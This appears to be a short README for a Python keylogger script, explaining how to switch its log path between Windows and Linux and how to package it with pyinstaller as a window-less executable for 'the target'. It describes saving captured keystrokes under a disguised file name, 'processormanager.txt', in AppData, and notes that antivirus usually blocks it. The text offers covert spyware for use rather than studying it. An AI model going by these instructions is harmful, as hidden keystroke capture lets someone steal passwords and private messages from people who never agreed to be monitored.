A basic script to log keys and save in a file
This is for windows
for linux uncomment the path=processormanager.txt and comment the line above
to use this as a exe file , install pyinstaller in the target
pyinstaller KeyLogger.py --onefile --noconsole
The file created is in user>AppData>Roaming as processormanager.txt
This usually gets blocked by windows defender and antivirus
